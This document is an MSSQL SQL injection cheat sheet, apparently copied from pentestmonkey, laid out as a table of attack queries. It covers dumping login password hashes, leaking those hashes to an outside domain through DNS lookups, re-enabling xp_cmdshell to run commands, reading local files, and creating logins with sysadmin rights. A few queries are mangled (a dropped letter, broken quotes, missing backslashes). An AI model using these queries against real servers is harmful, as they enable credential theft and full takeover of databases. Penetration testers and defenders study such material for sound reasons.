# SQLi - MSSQL

## From:

- https://www.slideshare.net/SOURCEConference/everything-you-should-already-know-about-mssql-postexploitation
- http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

| Enumerate    | Command                 |
|--------------|-------------------------|
| Version|`SELECT @@version`|
|Comments|`SELECT 1 — comment`<br>`SELECT /*comment*/1`|
|Current User | `SELECT user_name();`<br>`SELECT system_user;<br>SELECT user;`<br>`SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID`|
|List Users|`SELECT name FROM master..syslogins`|
|List Password Hashes|`SELECT name, password FROM master..sysxlogins` — priv, mssql 2000;<br>`SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins` — priv, mssql 2000. Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.<br>`SELECT name, password_hash FROM master.sys.sql_logins` — priv, mssql 2005;<br>`SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins` — priv, mssql 2005|
| Password Cracker|MSSQL 2000 and 2005 Hashes are both SHA1-based.  phrasen\|drescher can crack these.|
| List Privileges| – current privs on a particular object in 2005, 2008<br>`SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’);` — current database<br>`SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’);` — current server<br>`SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’);` –permissions on a table<br>`SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);` –permissions on a user– current privs in 2005, 2008<br>`SELECT is_srvrolemember(‘sysadmin’);`<br>`SELECT is_srvrolemember(‘dbcreator’);`<br>`ELECT is_srvrolemember(‘bulkadmin’);`<br>`SELECT is_srvrolemember(‘diskadmin’);`<br>`SELECT is_srvrolemember(‘processadmin’);`<br>`SELECT is_srvrolemember(‘serveradmin’);`<br>`SELECT is_srvrolemember(‘setupadmin’);`<br>`SELECT is_srvrolemember(‘securityadmin’);` – who has a particular priv? 2005, 2008<br>`SELECT name FROM master..syslogins WHERE denylogin = 0;`<br>`SELECT name FROM master..syslogins WHERE hasaccess = 1;`<br>`SELECT name FROM master..syslogins WHERE isntname = 0;`<br>`SELECT name FROM master..syslogins WHERE isntgroup = 0;`<br>`SELECT name FROM master..syslogins WHERE sysadmin = 1;`<br>`SELECT name FROM master..syslogins WHERE securityadmin = 1;`<br>`SELECT name FROM master..syslogins WHERE serveradmin = 1;`<br>`SELECT name FROM master..syslogins WHERE setupadmin = 1;`<br>`SELECT name FROM master..syslogins WHERE processadmin = 1;`<br>`SELECT name FROM master..syslogins WHERE diskadmin = 1;`<br>`SELECT name FROM master..syslogins WHERE dbcreator = 1;`<br>`SELECT name FROM master..syslogins WHERE bulkadmin = 1;`|
| List DBA Accounts| `SELECT is_srvrolemember(‘sysadmin’);` — is your account a sysadmin?  returns 1 for true, 0 for false, NULL for invalid role.  Also try ‘bulkadmin’, ‘systemadmin’ and other values from the documentation<br>`SELECT is_srvrolemember(‘sysadmin’, ‘sa’);` — is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.<br>`SELECT name FROM master..syslogins WHERE sysadmin = ’1′` — tested on 2005 |
| Current Database| `SELECT DB_NAME()` |
| List Databases| `SELECT name FROM master..sysdatabases;`<br>`SELECT DB_NAME(N);` — for N = 0, 1, 2, …|
| List Columns | `SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’);` — for the current DB only<br>`SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’;` — list colum names and types for master..sometable | 
| List Tables | `SELECT name FROM master..sysobjects WHERE xtype = ‘U’;` — use xtype = ‘V’ for views<br>`SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;`<br>`SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’;` — list colum names and types for master..sometable | 
| Find Tables From Column Name | – NB: This example works only for the current database.  If you wan’t to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).<br>`SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = ‘U’ AND syscolumns.name LIKE ‘%PASSWORD%’` — this lists table, column for each column containing the word ‘password’ | 
| Select Nth Row | `SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC` — gets 9th row | 
| Select Nth Char | `SELECT substring(‘abcd’, 3, 1)` — returns c | 
| Bitwise AND | `SELECT 6 & 2` — returns 2<br>`SELECT 6 & 1` — returns 0 |
| ASCII Value -> Char | `SELECT char(0×41)` — returns A |
| Char -> ASCII Value | `SELECT ascii(‘A’)` – returns 65 |
| Casting | `SELECT CAST(’1′ as int);`<br>`SELECT CAST(1 as char)` |
| String Concatenation | `SELECT ‘A’ + ‘B’` – returns AB |
| If Statement | `IF (1=1) SELECT 1 ELSE SELECT 2` — returns 1 |
| Case Statement | `SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END` — returns 1 |
| Avoiding Quotes | `SELECT char(65)+char(66)` — returns AB |
| Time Delay | `WAITFOR DELAY ’0:0:5′` — pause for 5 seconds |
| Make DNS Requests | `declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + ‘c$boot.ini”’);` — nonpriv, works on 2000<br>`declare @host varchar(800); select @host = name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + ‘c$boot.ini”’);` — priv, works on 2005– NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.<br>– Also check out theDNS tunnel feature of sqlninja |
| Command Execution | `EXEC xp_cmdshell ‘net user’;` — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:<br>`EXEC sp_configure ‘show advanced options’, 1;` — priv<br>`RECONFIGURE;` — priv<br>`EXEC sp_configure ‘xp_cmdshell’, 1;` — priv<br>`RECONFIGURE;` — priv |
| Local File Access | `CREATE TABLE mydata (line varchar(8000));`<br>`BULK INSERT mydata FROM ‘c:boot.ini’;`<br>`DROP TABLE mydata;` |
| Hostname, IP Address | `SELECT HOST_NAME()` |
| Create Users | `EXEC sp_addlogin ‘user’, ‘pass’;` — priv |
| Drop Users | `EXEC sp_droplogin ‘user’;` — priv | 
| Make User DBA | `EXEC master.dbo.sp_addsrvrolemember ‘user’, ‘sysadmin;` — priv |
|  Location of DB files | `EXEC sp_helpdb master;` –location of master.mdf<br>`EXEC sp_helpdb pubs;` –location of pubs.mdf |
| Default/System Databases | northwind<br>model<br>msdb<br>pubs — not on sql server 2005<br>tempdb|